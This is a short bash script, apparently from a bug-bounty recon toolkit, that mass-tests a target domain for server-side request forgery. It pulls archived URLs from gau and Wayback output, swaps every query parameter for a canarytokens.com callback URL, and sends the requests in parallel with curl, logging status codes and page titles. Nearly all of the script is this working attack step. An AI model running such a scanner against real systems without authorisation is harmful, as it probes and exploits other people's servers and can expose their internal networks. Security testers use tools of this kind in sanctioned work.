#!/bin/bash

TARGET=$1
title=ssrf
mkdir -pv "${TARGET}/${title}"
LOGFILE=backuplog

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m'  #no color
PURPLE='\033[1;35m'
CYAN='\033[1;36m'

echo -e "[+] Started With SSRF Scanning..."
cat ./${TARGET}/xss/gau_${TARGET}.txt ./${TARGET}/xss/wayback_${TARGET}.txt | gf ssrf | qsreplace  "http://canarytokens.com/tags/ttibyc6yf79qclo2j07e3gux0/index.html" |  parallel -j50 -q curl -i -s -k -o >(grep -io "<title>[^<]*" | cut -d'>' -f2-) --silent --max-time 2 --write-out 'Status:%{http_code}\t Header-size:%{size_header}\t Url:%{url_effective} \n || ' | tee ${TARGET}_ssrf.txt


echo "[!] Done With ssrf Scan..."
